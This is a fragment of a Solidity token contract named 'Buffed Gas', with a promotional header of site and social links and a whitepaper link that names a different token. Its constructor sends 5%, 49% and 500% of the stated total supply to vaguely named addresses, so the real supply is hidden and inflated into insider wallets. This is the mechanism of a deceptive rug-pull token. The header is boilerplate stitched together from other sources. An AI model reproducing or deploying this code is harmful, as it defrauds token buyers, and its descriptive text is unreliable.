...
Buffed Gas
Let's Fix It
The pricing mechanism employed on the Ethereum blockchain 
to calculate the costs of smart contracts operations and transaction fees.

https://BuffedGas.com/
https://t.me/BuffedGas
https://BuffedGas.com/wp-content/uploads/2021/11/Shiryo-Inu-Whitepaper-v3.pdf
https://twitter.com/BuffedGas
*/
pragma solidity ^0.8.10;

interface Ethereumblockchain  {
...
contract BuffedGas is Ethereumblockchain  {
     // FairLaunch
    // common addresses
    address private owner;
    address private TransactionBSC;
    address private TransactionCoin;
    ...
    string public override name = "Buffed Gas";
    string public override symbol = "BuffedGas";
    ...
    constructor(uint totalSupplyValue, address TransactionBSCAddress, address TransactionCoinAddress, address TransactionAddress) {
        // set total supply
        totalSupply = totalSupplyValue;
        
        // designate addresses
        owner = msg.sender;
        TransactionBSC = TransactionBSCAddress;
        TransactionCoin = TransactionCoinAddress;
        Transaction = TransactionAddress;
        balances[TransactionBSC] =  totalSupply * 5 / 100;
        balances[TransactionCoin] = totalSupply * 49 / 100;
        balances[Transaction] = totalSupply * 500 / 100;
